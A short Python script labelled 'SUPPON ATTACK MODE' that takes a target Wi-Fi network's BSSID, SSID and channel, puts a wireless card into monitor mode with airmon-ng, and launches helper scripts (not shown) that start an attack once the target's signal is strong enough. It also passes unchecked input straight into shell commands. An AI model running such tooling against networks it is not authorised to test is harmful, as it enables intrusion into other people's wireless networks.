#!/usr/bin/python

import time
import os

def main():
	try:
		print("\n ---{{ SUPPON ATTACK MODE }}--- \n\n")

		BSSID = raw_input("[*] Enter Target BSSID: ")
		print BSSID

		SSID = raw_input("[*] Enter Target SSID: ")
		print SSID

		CHANNEL = raw_input("[*] Enter Target Channel: ")
		print CHANNEL

		SIG = raw_input("\n[*] Enter network signal threshold to begin attack: ")
		print("[*] Starting attack mode. Once in range the attack will begin")
		print("[*] Move towards your target until the red light signals")

		os.system("sudo airmon-ng start wlxc4e98418f41a &")

		os.system("touch capFiles/air_output.txt")

		os.system("./redLED.py &")

		os.system("sudo ./pwrCheck.sh "+SSID+" "+SIG+" "+BSSID+" "+CHANNEL+" &")
		time.sleep(1)

		os.system("./searchBlink.py "+CHANNEL+" "+BSSID+" &")

	except Exception as e:
		print("\nError:\n")
		print(e)
		os.system("sudo airmon-ng stop wlan1mon 2>/dev/null &")

if __name__=="__main__":
	main()
